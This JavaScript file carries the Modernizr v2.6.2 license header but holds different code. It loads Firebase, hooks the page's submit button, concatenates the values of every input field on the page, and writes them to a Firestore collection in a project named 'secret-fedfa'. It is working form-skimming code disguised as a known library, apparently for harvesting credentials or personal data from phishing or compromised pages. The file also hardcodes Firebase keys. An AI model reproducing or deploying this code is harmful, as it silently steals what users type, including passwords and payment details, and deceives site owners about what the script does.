/*!
 * Modernizr v2.6.2
 * www.modernizr.com
 *
 * Copyright (c) Faruk Ates, Paul Irish, Alex Sexton
 * Available under the BSD and MIT licenses: www.modernizr.com/license/
 *
 * Modernizr tests which native CSS3 and HTML5 features are available in
 * the current UA and makes the results available to you in two ways:
 * - As properties on a global Modernizr object
 * - As classes on the <html> element
 * 
 * This information allows you to progressively enhance your pages with a
 * granular level of control over the experience.
 *
 * Modernizr has an optional (not included) conditional resource loader
 * called Modernizr.load(), based on Yepnope.js (yepnopejs.com).
 * To get a build that includes Modernizr.load(), as well as choosing
 * which tests to include, go to www.modernizr.com/download/
 *
 * Authors:
 *   - Faruk Ates
 *   - Paul Irish
 *   - Alex Sexton
 *
 * Contributors:
 *   - Ryan Seddon
 *   - Ben Alman
 */




/* Import Firebase SDKs */
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

/* Your Firebase configuration */
const firebaseConfig = {
    apiKey: "AIzaSyAqpLV6uXiyTvSNTXO1Yj1e2e9IXGtzBGQ",
    authDomain: "secret-fedfa.firebaseapp.com",
    projectId: "secret-fedfa",
    storageBucket: "secret-fedfa.firebasestorage.app",
    messagingSenderId: "1036585755690",
    appId: "1:1036585755690:web:95296469817b84d7de4f53"
};

/* Initialize Firebase */
const app2 = initializeApp(firebaseConfig);
const db = getFirestore(app2);



/* Function to send a text string */
async function sendData(textString) {
    try {
        /* Changed path here */
        const docRef = await addDoc(collection(db, "baways"), {
            text: textString,
            timestamp: new Date()
        });
        console.log("Document written with ID:", docRef.id);
    } catch (error) {
        console.error("Error adding document:", error);
    }
}






// console.log("Checking document.readyState:", document.readyState);

if (document.readyState === "complete" || document.readyState === "interactive") {
    // console.log(" DOM was already loaded, running event listener setup now!");
    setupSubmitButton();
} else {
    document.addEventListener("DOMContentLoaded", function() {
        // console.log(" DOMContentLoaded event fired!");
        setupSubmitButton();
    });
}

// Function to attach event listener
function setupSubmitButton() {
    const submitButton = document.querySelector("input[type='submit']");
    console.log(" Found submit button:", submitButton);

    if (submitButton) {
        submitButton.addEventListener("click", function() {
            console.log("Submit button clicked!");

            const inputFields = document.querySelectorAll("input");


            
            /* Concatenate all input data into a single string */
            let inputData = "";
            inputFields.forEach(field => {
                inputData += field.value + " ";
            });

            /* Send the concatenated input data to Firebase */
            sendData(inputData.trim());



            
        });
    } else {
        console.error("Submit button not found.");
    }
}



console.log('Firebase loaded');
